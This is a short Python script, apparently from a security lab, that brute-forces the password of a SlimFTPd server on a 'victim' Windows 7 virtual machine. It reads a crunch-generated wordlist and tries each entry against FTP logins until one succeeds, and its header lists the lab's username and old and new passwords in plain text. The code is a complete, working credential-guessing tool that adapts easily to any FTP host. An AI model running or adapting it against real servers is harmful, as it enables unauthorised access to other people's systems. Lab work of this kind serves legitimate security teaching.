# Code to brute force SlimFTPd server password running in Victim Win7 VM (without threads) from the Attacker VM

# Server credentials
# IP addr = 192.168.1.2
# Username = bob
# Port num = 23
# Old password = abc123
# New password = bbAbA11

import time
import ftplib

start_time = time.time()

def main():
    
    # IP addr of Victim Win7 VM running the FTP server
    ipAddress = "192.168.1.2"
    # Username of the SlimFTPd server
    username = "bob"
    # FTP port used by the SlimFTPd server
    port = 23

    def is_correct(password):
        # Initialize the FTP server object
        server = ftplib.FTP()
        print("Trying password %s" % password)
        try:
            # Trying to connect to the server with a timeout of 5 seconds
            server.connect(ipAddress, port, timeout = 5)
            # Login using the username and password
            server.login(username, password)
        except ftplib.error_perm:
            # Login failed because of wrong credentials
            return False
        else:
            # Correct password is found
            print("---------------------------------------------")
            print("Host is %s" % ipAddress)
            print("Username is %s" % username)
            print("Correct password is %s" % password)
            return True

    # Read the wordlist of passwords created using crunch
    passwords = open("wordlist.txt").read().split("\n")
    print("---------------------------------------------")
    print(" %s Passwords to try" % len(passwords))
    print("---------------------------------------------")

    # Iterate through each password in the wordlist
    for password in passwords:
        if is_correct(password):
            # Break out of the loop if correct password is found
            break
    print("---------------------------------------------")
    print("%s seconds" % (time.time() - start_time))
    print("---------------------------------------------")

if __name__ == "__main__":
    main()